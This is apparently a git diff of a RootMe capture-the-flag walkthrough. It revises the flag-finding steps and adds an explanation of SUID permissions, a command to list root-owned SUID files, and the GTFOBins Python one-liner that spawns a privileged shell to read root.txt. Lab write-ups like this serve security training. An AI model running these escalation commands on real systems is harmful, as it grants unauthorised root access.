@@ -205,19 +205,40 @@ You will see that we have successfully gained the shell.
 
 Now let’s search for the flag. We know that it is in user.txt as it is mentioned in the question.
 
-Run the command and open the file: ```cat /var/www/user.txt```: 
+Run the command 
 ```
 find / -type f -name user.txt 2> /dev/null
 ```
+and open the file: ```cat /var/www/user.txt```: 
+
 #### 3. How can I escalate my privileges in RootMe CTF?
 **SUID (Set User ID) is a special file permission in Linux and UNIX-like operating systems that allows a program to execute with the privileges of the file's owner, rather than the user running the program. It is used to enable ordinary users to perform tasks that typically require elevated privileges.**
 
 To escalate privileges, you’ll need to find files with SUID permissions and then use a specific Python command to gain higher access.
+**How SUID Works**
 
-Checking for SUID Files
-To list all files with the SUID bit set:
+**When a file with the SUID bit set is executed, the process gets the file owner's privileges during execution.**
+
+**The most common use case is programs that need to perform tasks as the root user, even when executed by a non-root user.**
+
+**Checking for SUID Files**
+
+**To list all files with the SUID bit set:**
 ```
-find / -perm -4000 -type f 2>/dev/null
+find / -type f -user root -perm -4000 2>/dev/null
 ```
+**We have the /usr/bin/python with SUID permission.**
+
+Now we will try to escalate our privileges. Lets go to https://gtfobins.github.io/ and look for possible privilege escalation commands for elevating the privileges.
+Search python in the search bar and choose “SUID”.
+```
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+```
+After running this command,type **whoami** to get confirmation that we indeed are a root user now.
+Now,to find the root.txt run this command:
+```
+find / -type f -name root.txt
+```
+Then run:``` cat /root/root.txt```
 
 ![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot%20from%202024-12-07%2022-37-30.png)
